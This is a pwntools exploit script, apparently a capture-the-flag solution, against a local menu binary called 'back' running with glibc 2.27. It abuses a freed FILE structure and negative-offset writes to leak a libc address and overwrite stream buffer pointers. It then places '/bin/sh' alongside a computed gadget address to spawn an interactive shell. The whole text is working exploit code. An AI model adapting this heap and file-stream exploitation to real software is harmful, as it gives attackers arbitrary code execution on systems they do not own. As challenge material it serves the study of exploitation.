from pwn import *

io = process("./back",env={"LD_PRELOAD":"./libc-2.27.so"})


def add(idx,size):
    io.sendlineafter("Your choice: ","1")
    io.sendlineafter("Index: ",str(idx))
    io.sendlineafter("Size: ",str(size))

def edit(idx,off,size):
    io.sendlineafter("Your choice: ","2")
    io.sendlineafter("Index: ",str(idx))
    io.sendlineafter("Offset: ",str(off))
    io.sendlineafter("Size: ",str(size))

def view(idx):
    io.sendlineafter("Your choice: ","3")
    io.sendlineafter("Index: ",str(idx))

def fopen():
    io.sendlineafter("Your choice: ","4")

def fclose():
    io.sendlineafter("Your choice: ","5")


fopen()
fclose()

add(0,544)              # uses the freed file structure
fopen()
edit(0,0,104)
view(0)               # get leak
io.recv(113)
libc_leak = u64(io.recv(6)+"\x00\x00")-0x3ec680
log.info("Libc @ "+str(hex(libc_leak)))

add(1,544)                # create a chunk infront of file structure to use -ve offset
edit(1,-4560,1)          # overwrite fd

add(2,0x1000)
edit(2,0,3991)

gdb.attach(io)
buf_base = libc_leak+0x3ebc20# + 0x3ed8d8
buf_end = libc_leak +0x3ebc40 #+ 0x3ed908
edit(1,-4616,16)
payload = p64(buf_base) + p64(buf_end)
io.send(payload)

#system = libc_leak+0x4f440

system = libc_leak + 0x10a38c

edit(1,-4688,8)
payload = "/bin/sh\x00"+"a"*8 + p64(system)
io.send(payload)

io.interactive()
